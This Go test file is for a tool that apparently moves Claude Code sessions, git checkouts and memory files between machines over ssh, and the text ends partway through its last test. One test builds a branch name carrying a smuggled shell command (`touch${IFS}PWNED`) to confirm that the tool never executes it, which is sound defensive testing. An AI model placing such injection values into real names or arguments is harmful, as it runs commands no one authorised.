package main

import (
	"context"
	"encoding/json"
	"errors"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"syscall"
	"testing"
	"time"
)

const fakeSSH = `#!/bin/sh
if [ "$1" = -G ]; then
  shift
  if [ "$1" = -- ]; then shift; fi
  name=$(awk -v h="$1" '$1 == h {print $2}' "$HOME/.fake-ssh-hosts" 2>/dev/null)
  echo "hostname ${name:-$1}"
  exit 0
fi
host=
while [ $# -gt 0 ]; do
  case "$1" in
    -o) shift 2 ;;
    --) shift; break ;;
    *) if [ -z "$host" ]; then host=$1; shift; else break; fi ;;
  esac
done
exec "${CIELAGO_TEST_LOGIN_SHELL:-sh}" -c "$*"
`

type fixture struct {
	t      *testing.T
	home   string
	local  string
	remote string
}

func newFixture(t *testing.T) *fixture {
	t.Helper()
	home, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	bin := filepath.Join(home, "bin")
	f := &fixture{t: t, home: home, local: filepath.Join(home, "laptop", "acme", "api"), remote: filepath.Join(home, "developer", "acme", "api")}
	f.write(bin, "ssh", fakeSSH)
	if err := os.Chmod(filepath.Join(bin, "ssh"), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("HOME", home)
	t.Setenv("PATH", bin+":"+os.Getenv("PATH"))
	t.Setenv("GIT_CONFIG_GLOBAL", "/dev/null")
	t.Setenv("GIT_CONFIG_NOSYSTEM", "1")
	t.Setenv("XDG_CONFIG_HOME", "")
	t.Setenv("GIT_AUTHOR_NAME", "t")
	t.Setenv("GIT_AUTHOR_EMAIL", "t@t")
	t.Setenv("GIT_COMMITTER_NAME", "t")
	t.Setenv("GIT_COMMITTER_EMAIL", "t@t")

	f.git(home, "init", "-q", "-b", "main", f.local)
	f.git(f.local, "remote", "add", "origin", "git@github.com:acme/api.git")
	f.write(f.local, ".gitignore", ".env*\nnode_modules/\n")
	f.write(f.local, "kept.txt", "v1")
	f.write(f.local, "edited.txt", "v1")
	f.write(f.local, "gone.txt", "v1")
	f.write(f.local, "staged-gone.txt", "v1")
	f.git(f.local, "add", ".")
	f.git(f.local, "commit", "-q", "-m", "init")
	f.git(home, "clone", "-q", f.local, f.remote)
	f.git(f.remote, "remote", "set-url", "origin", "https://github.com/acme/api")
	return f
}

func (f *fixture) git(dir string, args ...string) string {
	f.t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	out, err := cmd.CombinedOutput()
	if err != nil {
		f.t.Fatalf("git %v: %v\n%s", args, err, out)
	}
	return strings.TrimSpace(string(out))
}

func (f *fixture) write(dir, name, body string) {
	f.t.Helper()
	path := filepath.Join(dir, name)
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		f.t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		f.t.Fatal(err)
	}
}

func (f *fixture) read(dir, name string) string {
	f.t.Helper()
	data, err := os.ReadFile(filepath.Join(dir, name))
	if err != nil {
		return "<missing>"
	}
	return string(data)
}

func (f *fixture) remoteHost() *Remote {
	f.t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	f.t.Cleanup(cancel)
	r, err := newRemote(ctx, "fakehost")
	if err != nil {
		f.t.Fatal(err)
	}
	return r
}

func (f *fixture) machine() *Local {
	f.t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	f.t.Cleanup(cancel)
	l, err := newLocal(ctx)
	if err != nil {
		f.t.Fatal(err)
	}
	return l
}

func (f *fixture) push(r *Remote, ws Workspace, where Placement) error {
	l := f.machine()
	return syncProject(l, r, ws, where, nil, func() error { return pushGit(l, r, ws, where.Root) })
}

func (f *fixture) workspace(dir string) Workspace {
	f.t.Helper()
	ws, err := readWorkspace(f.machine(), dir, []string{".env", ".env.*"}, []string{"node_modules"})
	if err != nil {
		f.t.Fatal(err)
	}
	return ws
}

func (f *fixture) messUp(dir string) {
	f.t.Helper()
	f.write(dir, "committed.txt", "from a commit")
	f.git(dir, "add", "committed.txt")
	f.git(dir, "commit", "-q", "-m", "work")
	f.write(dir, "edited.txt", "staged")
	f.git(dir, "add", "edited.txt")
	f.write(dir, "edited.txt", "staged then edited")
	f.write(dir, "new-staged.txt", "new")
	f.git(dir, "add", "new-staged.txt")
	f.write(dir, "dir with space/untracked.bin", "\x00\x01binary")
	if err := os.Remove(filepath.Join(dir, "gone.txt")); err != nil {
		f.t.Fatal(err)
	}
	f.git(dir, "rm", "-q", "staged-gone.txt")
	f.write(dir, ".env", "SECRET=1")
	f.write(dir, "node_modules/pkg/.env", "not ours")
}

func TestHandoffReproducesCommitsStagingAndTheWorkingTree(t *testing.T) {
	f := newFixture(t)
	f.messUp(f.local)
	ws := f.workspace(f.local)
	if err := pushGit(f.machine(), f.remoteHost(), ws, f.remote); err != nil {
		t.Fatal(err)
	}
	if got, want := f.git(f.remote, "rev-parse", "HEAD"), f.git(f.local, "rev-parse", "HEAD"); got != want {
		t.Errorf("HEAD = %s, want %s", got, want)
	}
	if got, want := f.git(f.remote, "status", "--porcelain"), f.git(f.local, "status", "--porcelain"); got != want {
		t.Errorf("status on the host:\n%s\nwant:\n%s", got, want)
	}
	for _, name := range []string{"edited.txt", "new-staged.txt", "dir with space/untracked.bin", ".env", "gone.txt"} {
		if got, want := f.read(f.remote, name), f.read(f.local, name); got != want {
			t.Errorf("%s = %q, want %q", name, got, want)
		}
	}
	if got := f.read(f.remote, "node_modules/pkg/.env"); got != "<missing>" {
		t.Errorf("a .env inside node_modules was copied: %q", got)
	}
}

func TestHandoffRefusesAHostWithItsOwnUncommittedWork(t *testing.T) {
	f := newFixture(t)
	f.write(f.remote, "edited.txt", "host-only edit")
	err := pushGit(f.machine(), f.remoteHost(), f.workspace(f.local), f.remote)
	if err == nil || !strings.Contains(err.Error(), "uncommitted changes") {
		t.Fatalf("err = %v, want an uncommitted changes refusal", err)
	}
	if got := f.read(f.remote, "edited.txt"); got != "host-only edit" {
		t.Errorf("host edit was overwritten: %q", got)
	}
}

func TestSessionCanComeBackToTheCheckoutItLeft(t *testing.T) {
	f := newFixture(t)
	f.messUp(f.local)
	out := f.workspace(f.local)
	if err := pushGit(f.machine(), f.remoteHost(), out, f.remote); err != nil {
		t.Fatal(err)
	}
	if err := park(f.machine(), out.Root, out); err != nil {
		t.Fatal(err)
	}

	f.write(f.remote, "edited.txt", "continued on the host")
	f.write(f.remote, "host-new.txt", "made on the host")
	back := f.workspace(f.remote)
	if err := pushGit(f.machine(), f.remoteHost(), back, f.local); err != nil {
		t.Fatalf("handing back to the parked laptop failed: %v", err)
	}
	if got, want := f.git(f.local, "status", "--porcelain"), f.git(f.remote, "status", "--porcelain"); got != want {
		t.Errorf("laptop status after the round trip:\n%s\nwant:\n%s", got, want)
	}
	if got := f.read(f.local, "edited.txt") + "|" + f.read(f.local, "host-new.txt"); got != "continued on the host|made on the host" {
		t.Errorf("laptop files after the round trip = %q", got)
	}
	if out, _ := exec.Command("git", "-C", f.local, "rev-parse", "-q", "--verify", parkedRef).Output(); len(out) != 0 {
		t.Error("the laptop is still marked as parked after the session came back")
	}
}

func TestSessionCannotComeBackOverWorkDoneAfterLeaving(t *testing.T) {
	f := newFixture(t)
	f.messUp(f.local)
	out := f.workspace(f.local)
	if err := pushGit(f.machine(), f.remoteHost(), out, f.remote); err != nil {
		t.Fatal(err)
	}
	if err := park(f.machine(), out.Root, out); err != nil {
		t.Fatal(err)
	}
	f.write(f.local, "kept.txt", "edited on the laptop after the handoff")

	err := pushGit(f.machine(), f.remoteHost(), f.workspace(f.remote), f.local)
	if err == nil || !strings.Contains(err.Error(), "uncommitted changes") {
		t.Fatalf("err = %v, want a refusal", err)
	}
	if got := f.read(f.local, "kept.txt"); got != "edited on the laptop after the handoff" {
		t.Errorf("laptop edit was overwritten: %q", got)
	}
}

func TestARetryAfterAFailedHandoffIsAccepted(t *testing.T) {
	f := newFixture(t)
	f.messUp(f.local)
	ws := f.workspace(f.local)
	if err := pushGit(f.machine(), f.remoteHost(), ws, f.remote); err != nil {
		t.Fatal(err)
	}
	if err := pushGit(f.machine(), f.remoteHost(), f.workspace(f.local), f.remote); err != nil {
		t.Fatalf("a second attempt with the same changes was refused: %v", err)
	}
	if got, want := f.git(f.remote, "status", "--porcelain"), f.git(f.local, "status", "--porcelain"); got != want {
		t.Errorf("status after the retry:\n%s\nwant:\n%s", got, want)
	}
}

func TestARetryAfterAFailedHandoffAcceptsWorkDoneHereMeanwhile(t *testing.T) {
	f := newFixture(t)
	f.messUp(f.local)
	ws := f.workspace(f.local)
	r := f.remoteHost()
	if err := f.push(r, ws, Placement{Root: f.remote}); err != nil {
		t.Fatal(err)
	}
	err := undoSync(errors.New("the new session didn't start"), r, ws, Placement{Root: f.remote}, true)
	if !strings.Contains(err.Error(), "trying again updates it") {
		t.Errorf("undo said %q", err)
	}
	f.write(f.local, "kept.txt", "edited while the session kept running here")
	if err := f.push(r, f.workspace(f.local), Placement{Root: f.remote}); err != nil {
		t.Fatalf("the retry was refused over the copy the failed attempt left: %v", err)
	}
	if got := f.read(f.remote, "kept.txt"); got != "edited while the session kept running here" {
		t.Errorf("kept.txt on the server = %q", got)
	}
}

func TestHiddenUntrackedFilesOnTheHostAreNotOverwritten(t *testing.T) {
	f := newFixture(t)
	f.git(f.remote, "config", "status.showUntrackedFiles", "no")
	f.write(f.remote, "committed.txt", "HOST ONLY DATA")
	f.messUp(f.local)
	if err := pushGit(f.machine(), f.remoteHost(), f.workspace(f.local), f.remote); err == nil {
		t.Fatal("handoff went ahead over an untracked file that status hides")
	}
	if got := f.read(f.remote, "committed.txt"); got != "HOST ONLY DATA" {
		t.Errorf("host-only file was overwritten: %q", got)
	}
}

func TestIgnoredFilesOnTheHostAreNotOverwritten(t *testing.T) {
	f := newFixture(t)
	odd := `say "hi".md`
	f.write(f.remote, ".git/info/exclude", "*.md\n")
	f.write(f.remote, odd, "host notes")
	f.write(f.local, odd, "laptop notes")
	err := pushGit(f.machine(), f.remoteHost(), f.workspace(f.local), f.remote)
	if err == nil || !strings.Contains(err.Error(), "would be overwritten") {
		t.Fatalf("err = %v, want a refusal", err)
	}
	if strings.Contains(err.Error(), "exit status") {
		t.Errorf("the refusal carries shell noise: %q", err)
	}
	if got := f.read(f.remote, odd); got != "host notes" {
		t.Errorf("ignored host file was overwritten: %q", got)
	}
}

func TestAFileAddedOnTheParkedMachineIsNotCleanedAway(t *testing.T) {
	f := newFixture(t)
	f.messUp(f.local)
	out := f.workspace(f.local)
	if err := pushGit(f.machine(), f.remoteHost(), out, f.remote); err != nil {
		t.Fatal(err)
	}
	if err := park(f.machine(), out.Root, out); err != nil {
		t.Fatal(err)
	}
	f.write(f.local, "written-after.txt", "keep me")
	if err := pushGit(f.machine(), f.remoteHost(), f.workspace(f.remote), f.local); err == nil {
		t.Fatal("handoff back went ahead although the laptop gained a file after parking")
	}
	if got := f.read(f.local, "written-after.txt"); got != "keep me" {
		t.Errorf("new laptop file was removed: %q", got)
	}
}

func TestANewCloneOfAShallowCheckoutIsFilledFromOrigin(t *testing.T) {
	f := newFixture(t)
	upstream := filepath.Join(f.home, "upstream", "api.git")
	f.git(f.home, "clone", "-q", "--bare", f.local, upstream)
	f.write(f.local, "more.txt", "second commit")
	f.git(f.local, "add", ".")
	f.git(f.local, "commit", "-q", "-m", "second")
	f.git(f.local, "push", "-q", upstream, "main")
	shallow := filepath.Join(f.home, "laptop", "shallow", "api")
	f.git(f.home, "clone", "-q", "--depth", "1", "file://"+upstream, shallow)
	f.write(shallow, "wip.txt", "uncommitted")
	ws := f.workspace(shallow)
	r := f.remoteHost()
	where, err := place(r, ws, []string{"~/developer"}, "shallow", nil)
	if err != nil || where.NewFolder == "" {
		t.Fatalf("placed at %+v, %v", where, err)
	}
	if err := f.push(r, ws, where); err != nil {
		t.Fatalf("handing off a shallow clone into a new folder: %v", err)
	}
	if got := f.read(where.Root, "wip.txt"); got != "uncommitted" {
		t.Errorf("wip.txt = %q", got)
	}
	if got := f.git(where.Root, "rev-parse", "origin/main"); got != ws.Git.Head {
		t.Errorf("origin/main on the server = %s, want %s", got, ws.Git.Head)
	}
}

func TestARetryAfterSyncFailedPartwayIsAccepted(t *testing.T) {
	f := newFixture(t)
	f.messUp(f.local)
	f.write(f.remote, ".env/in-the-way", "x")
	r := f.remoteHost()
	if err := f.push(r, f.workspace(f.local), Placement{Root: f.remote}); err == nil {
		t.Fatal("copying .env over a folder of that name succeeded")
	}
	if err := os.RemoveAll(filepath.Join(f.remote, ".env")); err != nil {
		t.Fatal(err)
	}
	f.write(f.local, "kept.txt", "edited after the failed attempt")
	if err := f.push(r, f.workspace(f.local), Placement{Root: f.remote}); err != nil {
		t.Fatalf("the retry was refused over the copy the failed attempt applied: %v", err)
	}
	if got := f.read(f.remote, ".env") + "|" + f.read(f.remote, "kept.txt"); got != "SECRET=1|edited after the failed attempt" {
		t.Errorf("server = %q", got)
	}
}

func TestAFolderThatAppearsDuringAHandoffIsNeverRemoved(t *testing.T) {
	f := newFixture(t)
	notes := filepath.Join(f.home, "laptop", "notes")
	f.write(notes, "todo.md", "x")
	ws := f.workspace(notes)
	r := f.remoteHost()
	where, err := place(r, ws, []string{"~/developer"}, "notes", nil)
	if err != nil || where.NewFolder == "" {
		t.Fatalf("placed at %+v, %v", where, err)
	}
	f.write(where.NewFolder, "mine.md", "made by hand meanwhile")
	err = f.push(r, ws, where)
	if !errors.Is(err, errFolderAppeared) {
		t.Fatalf("err = %v, want the folder to be reported as appeared", err)
	}
	undoSync(err, r, ws, where, false)
	if got := f.read(where.NewFolder, "mine.md"); got != "made by hand meanwhile" {
		t.Errorf("the folder that appeared was touched: mine.md = %q", got)
	}
}

func TestASessionInAnEmbeddedRepositoryHandsOffTheWholeProject(t *testing.T) {
	f := newFixture(t)
	inner := filepath.Join(f.local, "tools", "inner")
	f.git(f.home, "init", "-q", "-b", "main", inner)
	f.write(inner, "a.txt", "v1")
	f.git(inner, "add", ".")
	f.git(inner, "commit", "-q", "-m", "inner")
	f.git(f.local, "add", "tools/inner")
	f.git(f.local, "commit", "-q", "-m", "embed")
	f.write(inner, "a.txt", "edited inside the embedded repository")
	ws := f.workspace(inner)
	if ws.Root != f.local || ws.Subdir != "tools/inner" || len(ws.Submodules) != 1 {
		t.Fatalf("root %s, subdir %s, submodules %+v", ws.Root, ws.Subdir, ws.Submodules)
	}
	f.git(f.remote, "pull", "-q", f.local, "main")
	if err := f.push(f.remoteHost(), ws, Placement{Root: f.remote}); err != nil {
		t.Fatal(err)
	}
	if got := f.read(filepath.Join(f.remote, "tools", "inner"), "a.txt"); got != "edited inside the embedded repository" {
		t.Errorf("a.txt on the server = %q", got)
	}
}

func TestUnparkClearsSubmodulesToo(t *testing.T) {
	f := newFixture(t)
	lib := filepath.Join(f.home, "upstream", "lib")
	f.git(f.home, "init", "-q", "-b", "main", lib)
	f.write(lib, "lib.txt", "v1")
	f.git(lib, "add", ".")
	f.git(lib, "commit", "-q", "-m", "lib")
	f.git(f.local, "-c", "protocol.file.allow=always", "submodule", "add", "-q", lib, "vendor/lib")
	ws := f.workspace(f.local)
	if err := park(f.machine(), ws.Root, ws); err != nil {
		t.Fatal(err)
	}
	if err := unpark(f.local, io.Discard); err != nil {
		t.Fatal(err)
	}
	for _, dir := range []string{f.local, filepath.Join(f.local, "vendor/lib")} {
		if out, _ := exec.Command("git", "-C", dir, "rev-parse", "-q", "--verify", parkedRef).Output(); len(out) > 0 {
			t.Errorf("%s is still parked", dir)
		}
	}
}

func TestReadWorkspaceRefusesAMergeInProgress(t *testing.T) {
	f := newFixture(t)
	f.git(f.local, "checkout", "-q", "-b", "side")
	f.write(f.local, "side.txt", "side")
	f.git(f.local, "add", "side.txt")
	f.git(f.local, "commit", "-q", "-m", "side")
	f.git(f.local, "checkout", "-q", "main")
	f.git(f.local, "merge", "--no-commit", "--no-ff", "-q", "side")
	if _, err := readWorkspace(f.machine(), f.local, nil, nil); err == nil || !strings.Contains(err.Error(), "in progress") {
		t.Fatalf("err = %v, want a merge-in-progress refusal", err)
	}
}

func TestReadWorkspaceHandlesACheckoutWithoutAnIndex(t *testing.T) {
	f := newFixture(t)
	bare := filepath.Join(f.home, "laptop", "no-index")
	f.git(f.home, "clone", "-q", "--no-checkout", f.local, bare)
	ws := f.workspace(bare)
	if ws.Git == nil || ws.Git.Worktree == "" {
		t.Fatalf("workspace = %+v, want a snapshot", ws)
	}
}

func TestPlainFolderStateTellsNewOwnAndForeignFoldersApart(t *testing.T) {
	f := newFixture(t)
	r := f.remoteHost()
	ours := filepath.Join(f.home, "developer", "notes", "notes")
	foreign := filepath.Join(f.home, "developer", "other", "notes")
	f.write(ours, "todo.md", "x")
	f.write(foreign, "todo.md", "y")
	if err := registerFolder(r, ours, nil); err != nil {
		t.Fatal(err)
	}
	if err := registerFolder(r, ours, nil); err != nil {
		t.Fatal(err)
	}
	for path, want := range map[string]string{
		ours:                                 "ours",
		foreign:                              "foreign",
		f.remote:                             "git",
		filepath.Join(f.home, "nope", "new"): "new",
	} {
		if got, err := folderState(r, path); err != nil || got.State != want {
			t.Errorf("folderState(%s) = %q, %v; want %q", path, got.State, err, want)
		}
	}
	if lines := strings.Count(f.read(f.home, ".cielago/folders"), "\n"); lines != 1 {
		t.Errorf("registry has %d lines, want one entry", lines)
	}
}

func TestPlainFoldersMirrorDeletionsAndRefuseChangedCopies(t *testing.T) {
	f := newFixture(t)
	r := f.remoteHost()
	laptop := filepath.Join(f.home, "laptop", "notes")
	server := filepath.Join(f.home, "developer", "notes", "notes")
	exclude := []string{"node_modules"}
	f.write(laptop, "todo.md", "ship it")
	f.write(laptop, "draft.md", "old draft")
	f.write(laptop, "node_modules/x.js", "big")
	if ws := f.workspace(laptop); ws.Git != nil || ws.Root != laptop || ws.Name != "notes" {
		t.Fatalf("workspace = %+v, want a plain folder", ws)
	}
	if err := mirrorFolder(f.machine(), laptop, r, server, exclude); err != nil {
		t.Fatal(err)
	}
	if got := f.read(server, "node_modules/x.js"); got != "<missing>" {
		t.Errorf("an excluded folder was copied: %q", got)
	}
	if err := registerFolder(r, server, exclude); err != nil {
		t.Fatal(err)
	}
	if err := settle(f.machine(), Workspace{Root: laptop}, exclude); err != nil {
		t.Fatal(err)
	}

	if err := os.Remove(filepath.Join(laptop, "draft.md")); err != nil {
		t.Fatal(err)
	}
	f.write(server, "node_modules/server-only.js", "kept")
	folder, err := folderState(r, server)
	if err != nil || folder.State != "ours" {
		t.Fatalf("state = %q, %v", folder.State, err)
	}
	if err := folderUnchanged(r, server, folder.Recorded, exclude); err != nil {
		t.Fatalf("an untouched copy counted as changed: %v", err)
	}
	if err := mirrorFolder(f.machine(), laptop, r, server, exclude); err != nil {
		t.Fatal(err)
	}
	if got := f.read(server, "draft.md"); got != "<missing>" {
		t.Errorf("a file deleted on the laptop survived on the server: %q", got)
	}
	if got := f.read(server, "node_modules/server-only.js"); got != "kept" {
		t.Errorf("an excluded folder on the server was touched: %q", got)
	}
	if err := registerFolder(r, server, exclude); err != nil {
		t.Fatal(err)
	}

	f.write(server, "todo.md", "edited on the server by hand")
	folder, _ = folderState(r, server)
	if err := folderUnchanged(r, server, folder.Recorded, exclude); err == nil {
		t.Fatal("a copy edited on the server counted as unchanged")
	}
	folder, err = folderState(f.machine(), laptop)
	if err != nil || folder.State != "ours" {
		t.Fatalf("the laptop folder wasn't recorded when the session left it: %q, %v", folder.State, err)
	}
	if err := folderUnchanged(f.machine(), laptop, folder.Recorded, exclude); err == nil {
		t.Fatal("the laptop folder changed after the session left (draft.md deleted) but counted as unchanged")
	}
}

func TestMirroringIntoThisMachineDeletesOnlyWhatTheSourceLacks(t *testing.T) {
	f := newFixture(t)
	t.Setenv("LC_ALL", "en_US.UTF-8")
	server := filepath.Join(f.home, "developer", "notes", "notes")
	laptop := filepath.Join(f.home, "laptop", "notes")
	f.write(server, "alpha", "kept")
	f.write(server, "b", "kept")
	f.write(server, "dir/inner", "kept")
	f.write(laptop, "alpha", "old")
	f.write(laptop, "b", "old")
	f.write(laptop, "Zeta", "gone on the server")
	f.write(laptop, "x\nb", "gone on the server")
	f.write(laptop, "old/deep/file", "gone on the server")
	if err := os.MkdirAll(filepath.Join(laptop, "empty"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("alpha", filepath.Join(laptop, "link")); err != nil {
		t.Fatal(err)
	}
	if err := mirrorFolder(f.remoteHost(), server, f.machine(), laptop, nil); err != nil {
		t.Fatal(err)
	}
	entries, err := os.ReadDir(laptop)
	if err != nil {
		t.Fatal(err)
	}
	var names []string
	for _, e := range entries {
		names = append(names, e.Name())
	}
	if got := strings.Join(names, ","); got != "alpha,b,dir" {
		t.Errorf("laptop has %q, want alpha,b,dir", got)
	}
	if got := f.read(laptop, "b"); got != "kept" {
		t.Errorf("b = %q", got)
	}
}

func TestARetryIntoAFolderTheFailedHandoffAlreadyFilledIsAccepted(t *testing.T) {
	f := newFixture(t)
	laptop := filepath.Join(f.home, "laptop", "notes")
	f.write(laptop, "todo.md", "ship it")
	ws := f.workspace(laptop)
	r := f.remoteHost()
	where, err := place(r, ws, []string{"~/developer"}, "notes", nil)
	if err != nil {
		t.Fatal(err)
	}
	if err := f.push(r, ws, where); err != nil {
		t.Fatal(err)
	}
	f.write(laptop, "todo.md", "ship it today")
	if _, err := place(r, ws, []string{"~/developer"}, "notes", nil); err != nil {
		t.Fatalf("the retry was refused over the files the failed attempt copied: %v", err)
	}
}

func TestAFolderFingerprintNoticesChangesAndFailsOnWhatItCannotRead(t *testing.T) {
	f := newFixture(t)
	dir := filepath.Join(f.home, "notes")
	f.write(dir, "a.md", "same size")
	m := f.machine()
	before, err := fingerprint(m, dir, nil)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(filepath.Join(dir, "a.md"), 0o600); err != nil {
		t.Fatal(err)
	}
	if after, _ := fingerprint(m, dir, nil); after == before {
		t.Error("a mode change wasn't noticed")
	}
	before, _ = fingerprint(m, dir, nil)
	f.write(dir, "a.md", "same SIZE")
	if err := os.Chtimes(filepath.Join(dir, "a.md"), time.Now(), time.Now().Add(time.Hour)); err != nil {
		t.Fatal(err)
	}
	if after, _ := fingerprint(m, dir, nil); after == before {
		t.Error("an edit that kept the size wasn't noticed")
	}
	if os.Geteuid() == 0 {
		return
	}
	if err := os.Mkdir(filepath.Join(dir, "locked"), 0o000); err != nil {
		t.Fatal(err)
	}
	f.write(dir, "z.md", "x")
	t.Cleanup(func() { os.Chmod(filepath.Join(dir, "locked"), 0o755) })
	if _, err := fingerprint(m, dir, nil); err == nil {
		t.Error("a folder it couldn't read gave a fingerprint instead of failing")
	}
}

func TestHandoffRefusesADivergedBranchWithoutRunningItsName(t *testing.T) {
	f := newFixture(t)
	branch := `x";touch${IFS}PWNED;"y`
	f.git(f.local, "check-ref-format", "--branch", branch)
	f.git(f.local, "checkout", "-q", "-b", branch)
	f.git(f.remote, "checkout", "-q", "-b", branch)
	f.write(f.remote, "host.txt", "host commit")
	f.git(f.remote, "add", "host.txt")
	f.git(f.remote, "commit", "-q", "-m", "host only")

	err := pushGit(f.machine(), f.remoteHost(), f.workspace(f.local), f.remote)
	if err == nil || !strings.Contains(err.Error(), "has commits this machine does not") {
		t.Fatalf("err = %v, want divergence refusal", err)
	}
	for _, dir := range []string{f.remote, f.local, f.home} {
		if _, err := os.Stat(filepath.Join(dir, "PWNED")); err == nil {
			t.Fatalf("branch name was executed as shell code (PWNED in %s)", dir)
		}
	}
}

func TestHandoffCreatesACloneForAProjectTheHostDoesNotHave(t *testing.T) {
	f := newFixture(t)
	f.messUp(f.local)
	r := f.remoteHost()
	ws := f.workspace(f.local)
	clones, err := listClones(r, []string{"~/developer"})
	if err != nil {
		t.Fatal(err)
	}
	ws.Git.Origin = "git@github.com:acme/brand-new.git"
	ws.Git.OriginKey = originKey(ws.Git.Origin, nil)
	if repo, err := matchClone(clones, ws, r.host); err != nil || repo != "" {
		t.Fatalf("matchClone = %q, %v; want no clone", repo, err)
	}
	dir := filepath.Join(f.home, "developer", "acme", "brand-new")
	if err := createClone(r, dir, ws.Git.Origin); err != nil {
		t.Fatal(err)
	}
	if err := pushGit(f.machine(), r, ws, dir); err != nil {
		t.Fatal(err)
	}
	if got, want := f.git(dir, "status", "--porcelain"), f.git(f.local, "status", "--porcelain"); got != want {
		t.Errorf("new clone status:\n%s\nwant:\n%s", got, want)
	}
	if got := f.git(dir, "branch", "--show-current"); got != "main" {
		t.Errorf("new clone branch = %q, want main", got)
	}
}

func TestMatchCloneFindsARepoWithNoRemoteByItsFirstCommit(t *testing.T) {
	f := newFixture(t)
	f.git(f.local, "remote", "remove", "origin")
	f.git(f.remote, "remote", "remove", "origin")
	r := f.remoteHost()
	clones, err := listClones(r, []string{"~/developer"})
	if err != nil {
		t.Fatal(err)
	}
	repo, err := matchClone(clones, f.workspace(f.local), r.host)
	if err != nil || repo != f.remote {
		t.Fatalf("matchClone = %q, %v; want %q", repo, err, f.remote)
	}
}

func TestSessionFilesFindTheSidecarAndExplainAMissingTranscript(t *testing.T) {
	f := newFixture(t)
	dir := filepath.Join(f.home, ".claude", "projects", "-x")
	f.write(dir, "s1.jsonl", "{}")
	f.write(dir, "s1/subagents/a.jsonl", "{}")
	set, err := sessionFiles(f.machine(), filepath.Join(dir, "s1.jsonl"))
	if err != nil || strings.Join(set.Files, ",") != "s1.jsonl,s1" || !set.Subagents {
		t.Fatalf("set = %+v, %v", set, err)
	}
	for _, missing := range []string{filepath.Join(dir, "gone.jsonl"), filepath.Join(f.home, "no-such-project", "s1.jsonl")} {
		if _, err := sessionFiles(f.machine(), missing); err == nil || !strings.Contains(err.Error(), "isn't there") {
			t.Errorf("a missing transcript %s gave %v", missing, err)
		}
	}
}

func TestMemoryIsMergedNotReplaced(t *testing.T) {
	f := newFixture(t)
	local := filepath.Join(f.home, "laptop-memory")
	remote := filepath.Join(f.home, "host-memory")
	f.write(local, "MEMORY.md", "- [Deploys](deploys.md) — laptop wording\n- [Style](style.md) — tabs\n")
	f.write(local, "style.md", "tabs")
	f.write(local, "deploys.md", "laptop deploys")
	f.write(remote, "MEMORY.md", "- [Deploys](deploys.md) — host wording\n- [Hosts](hosts.md) — names\n")
	f.write(remote, "hosts.md", "names")
	f.write(remote, "deploys.md", "host deploys, newer")
	future := time.Now().Add(time.Hour)
	if err := os.Chtimes(filepath.Join(remote, "deploys.md"), future, future); err != nil {
		t.Fatal(err)
	}

	if err := syncMemory(f.machine(), local, f.remoteHost(), remote); err != nil {
		t.Fatal(err)
	}
	if info, err := os.Stat(filepath.Join(remote, "MEMORY.md")); err != nil || info.Mode().Perm() != 0o600 {
		t.Errorf("MEMORY.md on the server: %v, %v; want it private", info.Mode(), err)
	}
	want := "- [Deploys](deploys.md) — laptop wording\n- [Style](style.md) — tabs\n- [Hosts](hosts.md) — names\n"
	if got := f.read(remote, "MEMORY.md"); got != want {
		t.Errorf("MEMORY.md =\n%s\nwant:\n%s", got, want)
	}
	if got := f.read(remote, "style.md") + "|" + f.read(remote, "hosts.md") + "|" + f.read(remote, "deploys.md"); got != "tabs|names|host deploys, newer" {
		t.Errorf("memory files = %q", got)
	}
}

func TestHandoffPromptCarriesTheNoteAndSubagentTranscripts(t *testing.T) {
	p := handoffPrompt(Prompt{From: "laptop", To: "server", OldDir: "/a", NewDir: "/b", Git: true,
		Note: "dev server on :3000; a subagent was halfway through the API tests", Sidecar: "/h/.claude/projects/-b/s1"})
	for _, want := range []string{"dev server on :3000", "/h/.claude/projects/-b/s1/subagents", "staged and unstaged", "confirming you're on server"} {
		if !strings.Contains(p, want) {
			t.Errorf("prompt is missing %q:\n%s", want, p)
		}
	}
}

func TestWaitForRemoteControlIgnoresBrokenAndStaleSessionFiles(t *testing.T) {
	f := newFixture(t)
	launched := time.Now()
	sessions := filepath.Join(f.home, ".claude", "sessions")
	f.write(sessions, "1.json", "{not json")
	f.write(sessions, "2.json", `{"sessionId":"s1","startedAt":1000,"bridgeSessionId":"old"}`)

	ctx, cancel := context.WithTimeout(context.Background(), 1500*time.Millisecond)
	defer cancel()
	r := f.remoteHost()
	r.SetContext(ctx)
	if err := waitForRemoteControl(r, "s1", launched); err == nil {
		t.Fatal("a stale session file from an earlier run counted as the new session")
	}

	f.write(sessions, "3.json", `{"sessionId":"s1","startedAt":`+strconv.FormatInt(launched.UnixMilli(), 10)+`,"bridgeSessionId":"cse_1"}`)
	if err := waitForRemoteControl(f.remoteHost(), "s1", launched); err != nil {
		t.Fatal(err)
	}
}

func TestWaitForRemoteControlWorksWithNoSessionFiles(t *testing.T) {
	f := newFixture(t)
	ctx, cancel := context.WithTimeout(context.Background(), 1200*time.Millisecond)
	defer cancel()
	r := f.remoteHost()
	r.SetContext(ctx)
	err := waitForRemoteControl(r, "s1", time.Now())
	if err == nil || !strings.Contains(err.Error(), "in time") {
		t.Fatalf("err = %v, want a timeout rather than a script failure", err)
	}
}

func TestIsTrustedAcceptsATrustedParent(t *testing.T) {
	f := newFixture(t)
	f.write(f.home, ".claude.json", `{"projects":{"`+f.home+`/developer":{"hasTrustDialogAccepted":true}}}`)
	r := f.remoteHost()
	if trusted, err := isTrusted(r, f.remote); err != nil || !trusted {
		t.Fatalf("trusted = %v, err = %v; want a trusted parent to count", trusted, err)
	}
	if trusted, err := isTrusted(r, filepath.Join(f.home, "elsewhere")); err != nil || trusted {
		t.Fatalf("trusted = %v, err = %v; want an untrusted folder to report false", trusted, err)
	}
}

func TestStopRemoteSessionStopsTheSessionWithoutKillingItself(t *testing.T) {
	f := newFixture(t)
	sessionID := "11111111-2222-3333-4444-555555555555"
